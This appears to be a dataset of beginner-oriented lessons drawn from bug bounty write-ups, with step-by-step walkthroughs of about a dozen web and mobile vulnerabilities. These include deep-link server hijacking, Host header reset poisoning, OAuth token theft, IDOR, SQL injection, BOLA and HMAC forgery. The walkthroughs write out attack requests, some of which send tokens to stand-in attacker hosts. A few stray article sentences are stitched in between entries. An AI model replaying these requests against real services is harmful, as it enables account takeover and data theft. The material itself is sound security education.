title: How a Login Link Could Switch kChat to an Attacker’s Server
summary_en: A vulnerability in kChat for Android allowed attackers to use a malicious deep link to force the app to connect to an attacker-controlled server, leaking the device's push token and hijacking future messages.

lesson.cause: The root cause was the application's failure to validate the server address parameter within its custom deep link handler. The app extracted a server URL from a link like 'kchat://<server-address>/login/one_time_link' and immediately used it to configure the app's backend connection. Because there was no whitelist check to ensure the address belonged to a trusted Infomaniak domain, the app would treat any attacker-supplied URL as a legitimate workspace. This allowed the app to send sensitive device identifiers to the rogue server and provision it as the active workspace for the user.
lesson.walkthrough:
RECON
1. Examine the 'AndroidManifest.xml' file (a file that tells Android how the app works) to find 'intent-filters' that handle custom URL schemes.
2. Identify that the app registers 'kchat://', 'kChat://', and 'mmauthbeta://' as browsable schemes (links that can be opened from a browser).

DISCOVERY
3. Analyze the URL structure used for magic link logins (a way to log in without a password using a special link).
4. Find the target route: 'kchat://<server-address>/login/one_time_link?t=<token>'.
5. Observe that the app extracts the '<server-address>' and the 't' (token) parameter without verifying the destination.

EXPLOITATION
6. Set up a malicious server (a 'stub') that mimics a real kChat/Mattermost server by responding to basic configuration and health check requests.
7. Craft a malicious deep link pointing to the attacker's server:
'kchat://attacker-server.com/login/one_time_link?t=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890'
8. Induce a user to click this link (e.g., via a phishing website or another app).
9. The Android system passes this link to the kChat app.
10. The app processes the link and sends a POST request (a message sending data to a server) to the attacker's server to attempt a login.
'POST /api/v4/users/login'
11. The payload (the data inside the request) contains the 'magic_link_token' and the 'device_id' (the device's unique push notification token).
'{"magic_link_token": "abcdef...", "device_id": "<redacted_push_token>"}'

IMPACT
12. The attacker captures the 'device_id' from their server logs.
13. The app successfully provisions the attacker's server as a new 'workspace' (a specific environment inside the app).
14. Because the attacker's workspace is now active, any messages the user types in that workspace are sent directly to the attacker's server instead of the legitimate one.
lesson.example: Imagine a fictional banking app called 'EasyBank' that uses a deep link to let users join a 'Family Group' by clicking 'easybank://join?server=bank-api.com&group=123'. If the app doesn't check the 'server' parameter, an attacker could send a link like 'easybank://join?server=evil-bank.com&group=666'. When the user clicks it, the app connects to 'evil-bank.com' and sends the user's session cookie (a small file used to keep you logged in) to the attacker. From then on, the app might show fake balance information or send transaction requests to the attacker's server instead of the real bank.
lesson.takeaway: When hunting for mobile vulnerabilities, always audit 'AndroidManifest.xml' for custom URL schemes and trace how the parameters in those links are used. If a parameter controls a URL that the app later contacts, it is a high-value target for SSRF (Server-Side Request Forgery) or unauthorized configuration. A common mistake is assuming that checking the format of a token (like ensuring it is 64 characters) is enough security; the real danger often lies in the destination where that token is sent. Look for 'magic link' or 'auto-config' features as they frequently bypass standard login protections.

title: How Trusting a Request Header Turned a Password Reset Into Account Takeover
summary_en: An attacker can hijack any user account by modifying the Host header in a password reset request, causing the site to send a legitimate reset email containing a link to the attacker's server.

lesson.cause: The application trusted the Host header—a piece of text sent by the user's browser—to construct the absolute URL for password reset links. Because the server used this untrusted input instead of a hardcoded domain, it allowed an attacker to 'poison' the link sent to victims, redirecting their secret reset tokens to a server controlled by the attacker.
lesson.walkthrough:
RECONNAISSANCE
1. Locate the password reset page on the target website (Mavenlink).
2. Enter a target email address to trigger a reset email.
3. Observe that the legitimate email contains a link like https://mavenlink.com/users/password/edit?reset_password_token=xyz.

DISCOVERY
4. Open a proxy tool like Burp Suite (a program that lets you see and change data sent between your computer and a website).
5. Trigger the password reset request again, but intercept it before it reaches the server.
6. Identify the Host header in the HTTP request (a line of text telling the server which website you are visiting).

EXPLOITATION
7. Change the Host header from the real domain to a domain you control.
POST /users/password HTTP/1.1
Host: attacker-controlled-server.com
...
Why: The server uses this header to decide what domain name to put in the email it is about to send.
8. Forward the modified request to the server.
9. The server processes the request normally, generates a real security token (a unique secret code used to prove identity), and sends an email to the victim's actual inbox.
10. The victim receives a perfectly branded, legitimate email from Mavenlink, but the link inside is now: https://attacker-controlled-server.com/users/password/edit?reset_password_token=xyz.

IMPACT
11. The victim, trusting the email, clicks the link.
12. The victim's browser sends a request to the attacker's server, including the secret token in the URL.
13. The attacker checks their server logs (a text file recording every visit to a website) to find the token.
14. The attacker visits the real Mavenlink reset page and uses the stolen token to set a new password, successfully taking over the account.
lesson.takeaway: Always test if the Host header or other headers like X-Forwarded-Host are reflected in emails, redirects, or scripts. This is especially dangerous in 'out-of-band' features like password resets or user invitations where the output is sent to a third party (the victim) who trusts the source. A common mistake is assuming headers are safe because browsers set them automatically; however, attackers can easily manipulate them using simple tools. Look for this pattern whenever a site generates a full URL (including the domain) dynamically.

title: I Started the Login. You Finished It. I Got Your Account.
summary_en: An attacker can take over any user account by starting a Google login flow and tricking the victim into completing it via a manipulated callback URL that prevents the victim's browser from consuming the authentication token.

lesson.cause: The vulnerability stems from three critical design flaws. First, the application generates a login identifier (Id) at the very start of the process and uses that same identifier as the final authentication token (t). Second, the backend does not bind this identifier to the specific browser session or device that started the request, allowing anyone with the ID to use it. Third, the backend's validation of the 'callbackUrl' (the address where the user is sent after logging in) was too loose, allowing the attacker to append extra path segments like '/x/y'. This caused the website's front-end code to fail to recognize the page as a login completion, leaving the authentication token unused and available for the attacker to redeem.
lesson.walkthrough:
RECON
1. The researcher analyzes the 'Continue with Google' button on 'shop.example'.
2. They observe that the login process is managed via a GraphQL API (a language used by apps to request specific data from a server).
3. They use a proxy (a tool that lets you see and change data moving between your browser and a server) to watch the HTTP requests (messages sent from your computer to a website's server).

DISCOVERY
4. The researcher clicks the login button and sees a GraphQL request sent to start the process.
POST /graphql
{"operationName":"startGoogleLogin","variables":{"callbackUrl":"https://shop.example/account/auth/login"}}
Why: This tells the server to prepare a login attempt and where to send the user afterward.
5. The server responds with an 'Id' and a Google URL.
{"data":{"startGoogleLogin":{"Id":"abc-123-xyz","googleUrl":"https://accounts.google.com/o/oauth2/auth?state=..."}}}
Why: The 'Id' is a unique string for this attempt, and the 'googleUrl' is the real Google login page.
6. After logging in, the researcher sees the browser redirect to the callback URL with a token 't'.
https://shop.example/account/auth/login?t=abc-123-xyz
Why: The researcher notices that 't' is identical to the 'Id' generated at the very beginning.

EXPLOITATION
7. The attacker starts a new login flow but intercepts the request to modify the 'callbackUrl'.
POST /graphql
{"operationName":"startGoogleLogin","variables":{"callbackUrl":"https://shop.example/account/auth/login/x/y"}}
Why: By adding '/x/y', the attacker creates an 'unhappy path' that the website's code won't know how to handle.
8. The attacker receives a valid Google URL from the server and sends it to the victim.
9. The victim clicks the link and signs into their real Google account.
10. Google redirects the victim to the attacker's modified URL.
https://shop.example/account/auth/login/x/y?t=abc-123-xyz
Why: Because the URL ends in '/x/y', the website's code doesn't trigger the 'redeem token' step, so the token 't' remains valid and unused.

IMPACT
11. The attacker now uses the 'Id' they already knew to finish the login in their own browser.
POST /graphql
{"operationName":"redeemToken","variables":{"token":"abc-123-xyz"}}
Why: The server sees a valid, unused token that was just authorized by the victim and grants the attacker the victim's session cookies.
12. The attacker is now logged in as the victim.
lesson.example: Imagine a site 'target.example' that uses a 'flow_id' for logins. When you click 'Login', the site generates 'flow_id=999'. It then sends you to a login provider. If you successfully log in, the provider sends you back to 'target.example/done?id=999'. An attacker could start a login, get 'flow_id=888', and change the return address to 'target.example/error?id=888'. They send the login link to a victim. The victim logs in, gets redirected to the '/error' page, and their browser does nothing. The attacker then manually visits 'target.example/done?id=888'. Because the server sees that '888' was successfully authorized by the victim and never 'spent', it logs the attacker in as the victim.
lesson.takeaway: When hunting OAuth bugs, always compare the identifiers used at the start of the flow with the tokens used at the end; if they are the same, the flow might be vulnerable to 'pre-authentication' hijacking. Test the flexibility of the callback URL by adding path segments or parameters to see if you can break the client-side logic while keeping the server-side token valid. This is a 'one-click' attack because it requires the victim to click a legitimate link. A common mistake for beginners is assuming that because a link points to 'google.com', it must be safe; always check what happens after the redirect.

title: P2 Broken Access Control Allowing Unauthorized Account Email Modification and Account Takeover
summary_en: An attacker can modify any user's registered email address by changing a user ID parameter in an account update request, enabling full account takeover via password reset.

lesson.cause: The application suffers from Broken Access Control because the backend server trusts the user-provided 'user_id' parameter without verifying if it matches the currently authenticated user. In a secure system, the server should ignore the ID sent in the request body and instead use the ID stored in the secure session or token. Because it fails to perform this check, any logged-in user can act as any other user by simply knowing or guessing their numeric ID.
lesson.walkthrough:
RECON
1. Identify the target application's account management page where users can update their profile details.
2. Create two separate test accounts: Account A (Attacker) and Account B (Victim).
3. Log in to Account A to obtain a valid session token (a secret code that proves you are logged in).
DISCOVERY
4. Navigate to the 'Edit Profile' section of Account A.
5. Open a web proxy tool like Burp Suite to intercept the HTTP request (a message sent from your browser to the server).
6. Enter a new email address for Account A and click 'Save'.
7. Capture the resulting POST request (an HTTP method used to send data to a server).
8. Analyze the request body, which is formatted in JSON (a standard way to organize data using names and values).
9. Observe the following request structure:
POST /api/v1/account/update HTTP/1.1
Host: <application-host>
Authorization: Bearer <ACCOUNT_A_TOKEN>
Content-Type: application/json
{
 "user_id": "1001",
 "email": "attacker@example.com"
}
10. Identify the 'user_id' parameter (a specific piece of data) as the key identifier for which account is being updated.
EXPLOITATION
11. Determine the 'user_id' for Account B (the victim), which is '1002'.
12. In the intercepted request, change the 'user_id' value from '1001' to '1002'.
13. Keep the 'Authorization' header (the part of the request containing the login token) as Account A's token.
14. Change the 'email' value to an email address you control.
15. The modified payload now looks like this:
{
 "user_id": "1002",
 "email": "hacker-controlled@example.com"
}
16. Forward the modified request to the server.
17. Observe the server's response to see if it returns a '200 OK' or 'Success' message.
IMPACT
18. Log out of Account A.
19. Attempt to log in or view the profile of Account B.
20. Confirm that Account B's email has been successfully changed to the attacker's email.
21. Go to the 'Forgot Password' page of the application.
22. Enter the victim's username or the new attacker-controlled email.
23. Receive the password reset link at the attacker-controlled email address.
24. Use the link to set a new password for Account B, completing the account takeover.
lesson.example:
Imagine a fictional site 'social.target.example' where users update their bio. The update request looks like this: 
PATCH /api/profile/edit 
{"profile_id": "99", "bio": "Hello world"}

An attacker logs in as profile '100'. They change the request to:
PATCH /api/profile/edit 
{"profile_id": "99", "bio": "This account is hacked"}

Because the server only checks if the attacker is logged in (Authentication) but doesn't check if profile '99' belongs to them (Authorization), the server updates the victim's bio. This is the same logic used to change the email in the original report.
lesson.takeaway: Always look for numeric or UUID parameters in the body of POST, PUT, or PATCH requests that seem to identify 'who' the action is for. If you can change a 'user_id', 'account_id', or 'owner_id' to another user's ID and the server accepts it while you are logged in as yourself, you have found an IDOR (Insecure Direct Object Reference). A common variant is finding these IDs in the URL path, such as /api/users/1001/update. A beginner mistake is assuming that because a request requires a login token, it is automatically secure; remember that authentication (who you are) is not the same as authorization (what you are allowed to do).

title: I Ignored a NEXT_PUBLIC_ Token for a Week. Then It Unlocked Blind SQLi and the Whole Database 🔓
summary_en: A leaked API token and tenant ID allowed access to a member API where the 'fields' parameter was vulnerable to SQL injection, enabling unauthorized database access.

lesson.cause: The application exposed sensitive environment variables (NEXT_PUBLIC_ API keys) to the client side, which are meant to be secret. Furthermore, the backend endpoint /api/member used string concatenation to build SQL queries using the 'fields' parameter as a column identifier. Since SQL prepared statements (a secure way to write queries) typically only parameterize values, not identifiers like column names, this manual string building created a direct injection point.
lesson.walkthrough:
RECON
1. The researcher performed subdomain enumeration (finding all sub-sites like blog.example.com) and JS analysis (reading the website's code to find hidden functions) on an Indian D2C company.
2. They checked the page source (the raw code of the website) and found leaked environment variables (settings stored on a server).
NEXT_PUBLIC_API_KEY="..." NEXT_PUBLIC_API_URL="..."
Why: NEXT_PUBLIC_ variables in Next.js are baked into the client-side code and are visible to any visitor (A beginner gloss: these are like leaving your house keys under the mat with a sign pointing to them).

DISCOVERY
3. The researcher attempted to use the leaked token (a digital key) with a curl command (a tool to send web requests) but received a 400 error (Bad Request).
curl -s https://api.target.in -H "Authorization: Bearer <LEAKED-TOKEN>"
Why: The error indicated the API key was valid but the system didn't know which 'tenant' (a specific organization's data) to access.
4. They investigated an acquired company's site and found a specific header (extra info in a web request) in the network traffic using Burp (a tool to intercept web traffic).
X-Tenant-Id: brand-name
Why: This provided the missing piece of the puzzle needed to route the API request correctly.
5. They found a specific endpoint (a web address for an API) in the JavaScript files that looked interesting.
/api/member?id=<id>&fields=given_name,email_addr
Why: Parameters (info added to a URL) that define which columns (categories of data) to return often indicate that the server is building a database query dynamically.

EXPLOITATION
6. The researcher combined the leaked token and the discovered tenant ID to successfully query their own account data.
curl -s https://api.acquisition.com/api/member?id=<my_id>&fields=given_name,email_addr -H "X-Tenant-Id: brand-name" -H "X-Api-Token: <LEAKED-TOKEN>"
Why: This proved the credentials worked and they could now interact with the private API.
7. They tested for SQL Injection (a bug where an attacker runs commands on a database) by providing a non-existent column name to the 'fields' parameter.
GET /api/member?id=<my_id>&fields=zzz
Why: If the server is insecure, it will try to find a column named 'zzz' and might return an error message explaining what happened.
8. The server returned a detailed error message revealing the internal SQL query (a command sent to a database).
{ "error": "column member.zzz does not exist", "query": "SELECT member.zzz FROM member WHERE member.id = <my_id>" }
Why: This confirmed that the input 'zzz' was placed directly into the SELECT clause of the query without any security checks (A beginner gloss: the server is literally repeating what you say directly to the database engine).
lesson.example: Imagine a site target.example that lets users sort products. The URL looks like: https://target.example/products?sort_by=price. The backend code is: query = "SELECT * FROM products ORDER BY " + req.query.sort_by. An attacker changes the URL to: https://target.example/products?sort_by=(CASE WHEN (SELECT 1)=1 THEN price ELSE name END). Because the developer joined the text together (concatenation) instead of using a safe method, the database executes the attacker's logic. This allows the attacker to slowly extract secret data by seeing how the sorting changes based on their 'CASE' conditions.
lesson.takeaway: Always inspect NEXT_PUBLIC_ variables in Next.js applications for sensitive keys that should remain server-side. When you encounter parameters that look like database column names (e.g., 'fields', 'sort', 'order'), test them for injection even if standard payloads like "' OR 1=1" fail. These are 'Identifier Injections' where you are injecting into the SELECT or ORDER BY clause, not the WHERE clause. A common mistake is assuming that because you can't use a single quote, the field is safe; identifiers often don't require quotes to be manipulated.

title: Soft-Deleted, Still Editable: BOLA in Munshi’s Invoice API
summary_en: An authenticated user could modify financial data in soft-deleted invoices by sending a PUT request to a specific API endpoint that lacked ownership and lifecycle state checks.

lesson.cause: The vulnerability stems from two primary failures: a lack of Broken Object Level Authorization (BOLA) and missing lifecycle state validation. The application uses 'soft deletion,' where a record is marked as deleted (is_deleted = 1) rather than being removed, but the update endpoint /api/invoice/{invoice_id}/extracted-data failed to check this flag before processing changes. Furthermore, the server did not verify if the authenticated user making the request actually owned the invoice or had the 'invoice_edit' permission. This allowed any logged-in user to overwrite critical financial data on any invoice ID they knew, even if that invoice was archived.
lesson.walkthrough:
RECON
1. Identify the target application's invoice management system and how it handles record updates.
2. Observe that deleting an invoice does not remove it from the database but sets a flag, a process called soft deletion (marking data as inactive instead of deleting it).

DISCOVERY
3. Locate the specific API endpoint used to update invoice details.
PUT /api/invoice/{invoice_id}/extracted-data
Why: This is the endpoint (a specific web address for API tasks) that handles the 'extracted_data' parameter (a variable containing invoice details like totals and names).
4. Capture a valid update request using a proxy tool to understand the required JSON (a text format for data) structure.

EXPLOITATION
5. Authenticate to the application as a standard user to obtain a valid session cookie (a small piece of data identifying your logged-in session).
6. Identify the ID of an invoice that has already been soft-deleted by the owner.
7. Construct a malicious PUT request targeting the deleted invoice ID.
PUT /api/invoice/12345/extracted-data
Why: The researcher replaces the {invoice_id} in the URL with the ID of the target deleted record.
8. Include a modified JSON payload in the request body to change financial values.
{
  "extracted_data": {
    "total_amount": "0.00",
    "seller_name": "ATTACKER_CONTROLLED"
  }
}
Why: The payload (the data sent in the request) contains the new values the attacker wants to force into the database.
9. Send the request to the server.

IMPACT
10. Observe the server response to confirm the bypass.
HTTP/1.1 200 OK
Why: A 200 OK response indicates the server accepted the update without checking if the invoice was deleted or if the user owned it.
11. Verify the database state to confirm the data was overwritten.
Why: The researcher confirmed that while 'is_deleted' remained 1, the 'total_amount' and 'seller_name' were successfully changed.
12. Note that this allows for the silent manipulation of historical financial records, destroying the integrity of the audit trail.
lesson.example: Imagine a fictional site 'target.example' that lets users manage 'Project Proposals.' When a user cancels a proposal, the site marks it as 'status: cancelled' but keeps it in the database. A beginner researcher finds the update endpoint: PUT /api/v1/proposals/987/content. Even though proposal 987 is cancelled and belongs to a different user, the researcher sends a request: PUT /api/v1/proposals/987/content HTTP/1.1 with the body {"budget": "$1,000,000"}. Because the server only checks if the user is logged in, but not if they own proposal 987 or if proposal 987 is still 'active,' the budget is successfully changed. This works because the backend code likely looks like 'UPDATE proposals SET content = ? WHERE id = ?' without adding 'AND owner_id = ? AND status != "cancelled"'.
lesson.takeaway: When hunting for BOLA, always test if 'finalized' or 'deleted' objects can still be modified. Developers often focus on hiding these records from the User Interface (UI) but forget to protect the backend API routes that handle updates. Look for endpoints that accept an ID in the URL and a large JSON object in the body, then try to swap the ID for one belonging to another user or an archived record. A common mistake is assuming that 'soft deletion' automatically makes a record read-only; it does not unless the developer explicitly adds a check for the deletion flag in every update function.

title: How I Escalated from Operator to Admin on a Leading Travel Platform on Hackerone Via GraphQL…
summary_en: An attacker with administrative rights over one supplier could escalate their privileges to Admin on any other supplier where they held a low-level role by exploiting a GraphQL mutation that failed to validate organization ownership.

lesson.cause: The vulnerability was caused by a lack of context-aware authorization in the backend. While the server checked if the user's JSON Web Token (a digital ID card used for authentication) contained an 'admin' role, it failed to verify if that admin status belonged to the specific supplierId provided in the request body. This allowed a user who was an admin for 'Company A' to use their admin status to modify 'Company B' simply by changing a number in the request.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher identified the GraphQL endpoint, which is a specific web address used to send and receive complex data queries.
POST /graphql
Why: To find where the application processes data updates (a 'mutation' in GraphQL terms).

SETUP
2. The researcher created two separate accounts: Attacker (Admin of Supplier A) and Victim (Admin of Supplier B).
3. From the Victim account, the researcher invited the Attacker's email to join Supplier B with a low-privilege 'Ticketing' role.
Why: This creates a link where the Attacker is an Admin in one place but a restricted user in another.

DISCOVERY
4. The researcher logged into the Attacker account and navigated to their own company's management page.
5. They initiated a request to update a user and intercepted it using Burp Suite (a tool used to pause and inspect web traffic).
6. They examined the GraphQL mutation, which is a request type used to change data on the server.
mutation accountUpdate($input: AccountUpdateInput!) { ... }
Why: To see how the application structures requests for changing user roles.

EXPLOITATION
7. The researcher identified the 'supplierId' parameter, which is a unique number identifying a specific company.
8. They replaced the 'supplierId' of their own company with the 'supplierId' of the Victim company.
9. They ensured the 'role' parameter was set to 'ADMIN'.
{
  "input": {
    "supplierId": "VICTIM_ID_HERE",
    "role": "ADMIN"
  }
}
Why: To tell the server to grant Admin rights on the Victim's company instead of the Attacker's company.
10. The researcher sent the request using their own Admin JWT (JSON Web Token), which is a string of characters representing their identity and permissions.
Why: The server saw a valid 'Admin' token and mistakenly applied that authority to the Victim's company ID provided in the payload (the data part of the request).

IMPACT
11. The server responded with a success message, indicating the role change was accepted.
12. The researcher logged back in and confirmed they now had full Admin access to the Victim's company, including financial records and traveler PII (Personally Identifiable Information like names and passport details).
lesson.takeaway: When hunting for bugs in multi-tenant applications (apps where many companies share the same software), always test if an administrative action in one 'tenant' can be applied to another. Look for requests that include an organization ID, company ID, or supplier ID in the body. A common mistake for beginners is assuming that because a request requires an 'Admin' token, it is secure; you must verify that the token's authority matches the specific object being modified. Use tools like 'GraphQL Voyager' to map out all available mutations and look for those involving roles or permissions.

Let’s dive into how I found it, how it worked, and how it was successfully patched! title: The Internal Tool T-Mobile Forgot Was Facing the Public Internet
summary_en: An internal T-Mobile customer care portal was accidentally exposed to the public internet, allowing anyone to access sensitive customer data including account PINs by simply entering a phone number into the URL.

lesson.cause: The root cause was a failure in network segmentation and the lack of 'defense in depth' (using multiple layers of security). Developers assumed the tool would only be reachable from T-Mobile's internal corporate network, so they did not implement a login screen or any authentication (the process of verifying who a user is). When the subdomain 'promotool.t-mobile.com' was accidentally made public, the API (a system that allows two applications to talk to each other) had no secondary security layer to stop unauthorized access.
lesson.walkthrough:
RECON
1. The researcher performed subdomain enumeration (using tools to find all web addresses belonging to a company) to find hidden assets.
2. The researcher discovered an active subdomain that sounded like an internal utility.
https://promotool.t-mobile.com
Why: Subdomain enumeration often reveals 'forgotten' infrastructure that isn't linked on the main website (a subdomain is a prefix to a main domain, like 'blog' in 'blog.example.com').

DISCOVERY
3. The researcher navigated to the URL in a standard web browser.
https://promotool.t-mobile.com
Why: To see if the server requires a password or if it is publicly accessible (a server is a computer that provides data to other computers).
4. The researcher observed a 'Customer Care' dashboard that loaded immediately without asking for credentials (a username and password).
Why: This indicates a total lack of access control (rules that determine who can see or use resources).

EXPLOITATION
5. The researcher identified how the tool requested data by looking at the URL structure or network traffic.
6. The researcher appended a target phone number to the end of the API endpoint (a specific URL path where an API receives requests).
https://promotool.t-mobile.com/[endpoint]/[phone_number]
Why: The application used the phone number as a parameter (a piece of information passed to a program to customize its behavior) to look up records.

IMPACT
7. The server responded with a full data profile for that phone number.
{
  "name": "[REDACTED]",
  "address": "[REDACTED]",
  "account_pin": "1234"
}
Why: Because there was no check to see if the person asking for the data was an authorized employee, the server simply returned the requested database record (a database is an organized collection of structured information).
lesson.example: Suppose a fictional company 'target.example' has an internal tool for managers to view employee performance reviews at 'reviews.target.example'. The developers assume only managers on the office Wi-Fi can see it. An attacker finds the URL and tries: 'https://reviews.target.example/api/getReview?employeeID=501'. Because the developers didn't add a login check to the 'getReview' function, the server sends back the private performance review for employee 501 to the attacker. This works because the application trusts the network location instead of the user's identity.
lesson.takeaway: Always investigate subdomains containing keywords like 'tool', 'internal', 'dev', 'stage', or 'portal'. These often host applications built with the assumption that 'nobody will find this,' leading to missing authentication. A key variant is the 'hidden' API endpoint that isn't used by the main website but still exists on the server. Avoid the 'security through obscurity' mistake, which is the belief that a system is secure just because its inner workings or location are unknown to the public.
lesson.fix: The fix is to implement 'Zero Trust' architecture, where every request is authenticated regardless of whether it comes from an internal or external network. Use a centralized authentication provider (like Okta or Azure AD) to gate the entire subdomain. In code, ensure every API endpoint checks for a valid session token (a temporary digital key given after a successful login) before returning data. Example fix: 'if (!user.isAuthenticated()) { return 403_Forbidden; }'.

title: How I Found an Admin Session That Refused to Die — A Role-Based Access Control Horror Story
summary_en: A logic flaw in the invitation system allowed users invited as Admins to retain full administrative privileges even after being downgraded to Viewers, as their active sessions were never invalidated.

lesson.cause: The application suffers from inconsistent session management across different user-lifecycle paths. While the 'promotion' code path (Viewer to Admin) correctly triggers a session refresh when a user is later downgraded, the 'direct invitation' path (starting as Admin) fails to link the downgrade action to the active session. This results in the application relying on stale role information stored in the session object—a temporary data storage for a logged-in user—rather than checking the current database state for every administrative request.
lesson.walkthrough:
RECON
1. Identify the two primary roles in the B2B hub: Admin (full control) and Viewer (read-only).
2. Note that an Admin can manage other users, including changing their roles.

DISCOVERY
3. Test for IDOR (Insecure Direct Object Reference: when an app provides direct access to objects based on user-provided input) by swapping IDs between a Viewer and Admin.
4. Observe that the application correctly returns a 403 Forbidden error, indicating standard access controls are working.
5. Test the 'Promotion' flow: Create a Viewer, promote them to Admin, then downgrade them back to Viewer.
6. Observe that the session is killed instantly, forcing a re-login (correct behavior).

EXPLOITATION
7. Test the 'Direct Invitation' flow: Invite a brand-new user directly with the Admin role.
GET /api/invite?email=attacker@example.com&role=Admin
Why: This creates a user who is an Admin from the very first second of their account's existence.
8. Log in as the new user and confirm Admin access is active.
9. Using the Organization Owner account, downgrade the new user from Admin to Viewer.
POST /api/users/update-role
{"userId": "123", "newRole": "Viewer"}
Why: This changes the user's status in the database but fails to notify the active session.
10. As the downgraded user, refresh the page and check the session data.
GET /api/session/me
Why: The response still shows "roles": "Admin" because the session was not invalidated (terminated by the server).
11. Attempt an Admin-only action, such as deleting a resource or managing other users.
DELETE /api/organization/settings
Why: The server checks the role stored in the active session cookie (a small piece of data identifying the user) instead of the database, allowing the unauthorized action to succeed.

IMPACT
12. Confirm that the user maintains full Admin control indefinitely until they manually log out, effectively bypassing the role revocation.
lesson.example: Imagine a fictional site 'cloud-editor.example'. The site has 'Editors' and 'Viewers'. When you invite a user as an 'Editor', the server creates a session token that says 'is_editor: true'. If the owner later changes that user to a 'Viewer' in the settings panel, the server updates the database but forgets to tell the user's browser to throw away the old token. The user's browser continues sending the 'is_editor: true' token with every request. The server, seeing the token, allows the user to keep editing files even though their permissions were officially revoked.
lesson.takeaway: Always test 'initial state' vs 'transition state.' A bug might not exist when a user moves from A to B, but it might exist if they start at B. When hunting for access control bugs, look for actions that should trigger a session logout or refresh, such as password changes, email updates, or role downgrades. If the session remains active and the old permissions still work, you have found a vulnerability. Common variants include 'Ghost Admins' where deleted users can still perform actions if their session wasn't killed. Avoid the mistake of assuming that because one path (promotion) is secure, all paths (invitation) are also secure.
lesson.fix: The application should implement a 'Global Sign-out' or session invalidation logic that triggers whenever a user's permissions are modified. Instead of trusting the role stored in a session cookie or JWT (JSON Web Token: a compact way to send info between parties), the server should perform a 'stateless' check against the database for every high-privilege request. Alternatively, ensure that the code responsible for role updates explicitly clears all active session keys for that specific User ID in the session store (like Redis).

title: Information Disclosure — Intercom Identity Verification secret (HMAC key) is hard-coded in…
summary_en: A web application exposed its Intercom HMAC secret key within a public JavaScript bundle, allowing attackers to forge identity hashes and impersonate any user to access private support conversations.

lesson.cause: The root cause was a fundamental architectural error where a cryptographic secret, intended only for server-side use, was included in the client-side JavaScript bundle. Specifically, the application used the CryptoJS library to calculate the Intercom 'user_hash' directly in the browser. This required the HMAC secret key to be present in the plaintext JavaScript code, making it accessible to any visitor who inspected the site's source files. Because the application used sequential integers for member IDs, an attacker could easily guess other users' IDs and use the exposed secret to generate valid authentication tokens for them.
lesson.walkthrough:
RECON
1. Open the target website and access the browser's Developer Tools (usually F12).
2. Navigate to the 'Sources' or 'Network' tab to view the JavaScript bundles (files containing the code that runs the website).

DISCOVERY
3. Search through the JavaScript files for keywords like 'Intercom', 'secret', or 'user_hash'.
4. Locate the specific file (e.g., ***.js) where the Intercom Messenger is initialized.
5. Identify the hard-coded HMAC secret key and the logic used to generate the user hash.
CryptoJS.HmacSHA256(member_id, "EXPOSED_SECRET_KEY")
Why: The researcher found the actual secret key used for 'Identity Verification' (a security feature to prove who a user is) sitting in plain text (unencrypted, readable text) inside the code.

EXPLOITATION
6. Note your own member ID, which is a sequential integer (a whole number that follows a predictable order, like 101, 102, 103).
7. Use a tool like an online HMAC generator or a local script to test if you can recreate the hash the browser is sending.
8. Input your member ID and the discovered secret key into the HMAC-SHA256 function.
9. Compare the output to the 'user_hash' sent in the network request to Intercom; the researcher confirmed they matched byte-for-byte.
10. To impersonate another user, pick a different member ID (e.g., if yours is 1005, try 1004).
11. Generate a new 'user_hash' using the target's ID and the stolen secret key.

IMPACT
12. Manually trigger the Intercom 'boot' function in the browser console using the victim's ID and the forged hash.
Intercom('boot', { app_id: '***', user_id: 'VICTIM_ID', user_hash: 'FORGED_HASH' });
Why: This tells the Intercom chat widget to log in as the victim. Because the hash is valid (signed with the correct secret), Intercom trusts the identity.
13. Observe that the chat widget now displays the victim's private support history, which may contain PII (Personally Identifiable Information, like names or account details).
lesson.takeaway: Always assume that any code or data sent to the browser is public knowledge. Cryptographic secrets used for signing (like HMAC keys) must never leave the server. When hunting, look for 'Identity Verification' features in third-party integrations like Intercom, Zendesk, or HelpScout, and check if the 'hash' or 'signature' is being calculated in the frontend. A common sign of this is seeing libraries like CryptoJS or Forge being used alongside hard-coded strings that look like API keys or secrets. Also, watch for sequential IDs (1, 2, 3...) which make it trivial to scale an attack once a secret is found.

The web application target (***) does the opposite: it computes the `user_hash` **in the browser**, which means the secret key is shipped to every visitor inside a JavaScript bundle. title: Pre-Auth Account Takeover via Broken Password Reset in a Legacy Mobile API
summary_en: A legacy SOAP API allowed full account takeover by exposing password reset tokens in responses and failing to validate those tokens during the password change process.

lesson.cause: The vulnerability was caused by two major security failures in a legacy SOAP API (a protocol for exchanging structured information in web services). First, the 'ForgotPassword' endpoint (a specific URL where an API receives requests) leaked the secret reset token directly in the API response body instead of only sending it to the user's email. Second, the 'ResetForgottenPassword' endpoint was programmed to accept a new password for any email address without requiring or verifying the reset token, allowing anyone to bypass the authentication (the process of verifying who a user is) entirely.
lesson.walkthrough:
RECON
1. Locate the legacy SOAP endpoint. (SOAP: A protocol for exchanging structured information in web services).
2. Access the WSDL file to map available operations. (WSDL: An XML file that describes what functions a web service offers).
DISCOVERY
3. Identify the 'ForgotPassword' and 'ResetForgottenPassword' operations in the WSDL.
EXPLOITATION
4. Create a test account to act as the victim.
SOAPAction: CreateGenericAccount EmailAddress: victim@example.com Password: OldPass!111
Why: To establish a baseline for testing the attack using a specific payload (the actual data sent in a request).
5. Log in to confirm the account is active.
SOAPAction: LoginV3 EmailAddress: victim@example.com Password: OldPass!111
Why: To ensure the initial credentials work via an HTTP request (a message sent by a client to a server).
6. Trigger a password reset for the victim's email.
SOAPAction: ForgotPassword EmailAddress: victim@example.com
Why: The researcher observed that the server's response contained the secret reset token (Information Disclosure: when a system reveals sensitive data to unauthorized users).
7. Attempt to change the password by providing only the email and a new password.
SOAPAction: ResetForgottenPassword EmailAddress: victim@example.com NewPassword: NewPass!222
Why: To test if the server enforces the use of a reset token (a unique secret code used to prove identity). It did not, allowing an unauthenticated user to change any password.
IMPACT
8. Attempt to log in with the old password.
SOAPAction: LoginV3 EmailAddress: victim@example.com Password: OldPass!111
Why: To confirm the original password has been invalidated.
9. Log in with the new attacker-chosen password.
SOAPAction: LoginV3 EmailAddress: victim@example.com Password: NewPass!222
Why: To prove full account takeover and access to PII (Personally Identifiable Information like names and phone numbers).
